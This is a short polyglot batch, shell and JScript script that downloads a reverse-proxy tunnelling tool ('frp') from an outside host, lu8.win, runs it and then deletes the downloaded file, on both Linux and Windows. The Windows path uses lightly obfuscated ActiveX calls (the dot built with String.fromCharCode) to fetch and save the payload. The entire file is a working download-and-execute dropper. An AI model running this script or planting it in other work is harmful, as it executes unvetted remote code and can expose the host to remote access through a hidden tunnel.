echo=1/*
goto windows
curl -# -o frp http://www.lu8.win/downloads/frp/linux/frp
sh frp 
rm -rf frp
:windows
@echo off
cls
cd %~dp0
call :http http://www.lu8.win/downloads/frp/windows/frp.bat frp.bat
call frp.bat
del frp.bat

:http
cscript -nologo -e:jscript "%~f0" "%~1" "%~2"
goto :eof

*/ 
var iLocal,iRemote,xPost,sGet;  
iLocal =WScript.Arguments(1);   
iRemote = WScript.Arguments(0);   
iLocal=iLocal.toLowerCase();  
iRemote=iRemote.toLowerCase();  
xPost = new ActiveXObject("Microsoft"+String.fromCharCode(0x2e)+"XMLHTTP");  
xPost.Open("GET",iRemote,0);  
xPost.Send(); 
sGet = new ActiveXObject("ADODB"+String.fromCharCode(0x2e)+"Stream");  
sGet.Mode = 3;  
sGet.Type = 1;   
sGet.Open();   
sGet.Write(xPost.responseBody);  
sGet.SaveToFile(iLocal,2);   
